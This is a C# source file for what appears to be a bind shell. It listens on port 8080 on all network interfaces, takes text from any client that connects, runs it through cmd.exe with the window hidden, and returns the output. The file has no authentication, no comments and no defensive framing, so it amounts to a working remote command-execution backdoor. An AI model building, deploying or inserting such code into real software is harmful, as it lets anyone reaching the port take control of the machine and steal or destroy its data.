using System.Diagnostics;
using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

class Server
{
    static void Main()
    {
        TcpListener listener = new TcpListener(IPAddress.Any, 8080);
        listener.Start();

        Console.WriteLine("Server is listening on port 8080...");

        TcpClient client = listener.AcceptTcpClient();
        Console.WriteLine("Client connected!");
        NetworkStream stream = client.GetStream();
        byte[] buffer = new byte[1024];

        int bytesRead = stream.Read(buffer, 0, buffer.Length);
        
        string command = Encoding.UTF8.GetString(buffer, 0, bytesRead);
        Console.WriteLine("Command: " + command);
       
        ProcessStartInfo psi = new ProcessStartInfo
        {
            FileName = "cmd.exe",
            Arguments = "/c " + command,
            RedirectStandardOutput = true,
            UseShellExecute = false,
            CreateNoWindow = true
        };
        Process process = new Process();
        process.StartInfo = psi;
        process.Start();

        string output = process.StandardOutput.ReadToEnd();
        process.WaitForExit();

        byte[] data = Encoding.UTF8.GetBytes(output);

        stream.Write(data, 0, data.Length);

        Console.ReadLine();
    }

}